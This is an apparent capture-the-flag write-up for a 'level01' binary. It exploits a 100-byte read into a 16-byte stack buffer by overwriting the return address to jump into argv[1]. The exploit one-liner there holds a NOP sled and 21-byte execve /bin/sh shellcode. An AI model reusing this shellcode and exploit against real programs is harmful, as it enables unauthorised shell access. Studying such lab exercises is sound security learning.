# Shell code

## Context

The program read twice stdin to get a admin login and password login.

```bash
./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: 
Enter Password:
```

First read seems unoverwritable because it is not write in stack.

```c
  fgets(&a_user_name,0x100,stdin);
```

We need enter a 'dat_wil' to go through the first read, or the program exit.

```c
  pbVar3 = (byte *)"dat_wil";
```

Second buffer seems overflow on the stack because it read 100 in a buffer[16].

```c
    fgets((char *)buffer_16,100,stdin);
```

```bash
Enter Password: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
nope, incorrect password...

Segmentation fault (core dumped)
```

## Exploit With shell code

Get offset with gdb:

```py
[+] Found at offset 80 (little-endian search) likely
```

Lets try the offset : 

```py
r < <(python3 -c 'import sys; sys.stdout.buffer.write(b"dat_wil" + b"\x00" + b"\n" + b"A" * 80 + b"BBBB")')
stopped 0x42424242
```
Well, it nice seg !

### Payload

I gonna split the payload in two parts : first overwrite the address. And second gonna write the shell code in argv[1] to wrote it in the stack.

- payload1 = "dat_wil" + fell the first buffer + Offset + buffer address
- payload2 = padding \x90 + shell code.

:warning: Its important to add a big padding, i did try with a 20 padding, it segfaulted. I increased it, it worked.

- shell code : ```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80``` (21 bytes)
- argv[1] buffer address = 0xffffd7ec

final payload : 

```py
cat <(python2.7 -c 'import sys; sys.stdout.write(b"dat_wil" + b"\x00" + b"\x90" * 248 + b"\x90" * 79 + b"\xec\xd7\xff\xff")') - | ./level01  $(python2.7 -c 'import sys; sys.stdout.write(b"\x90" * 0xffff + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```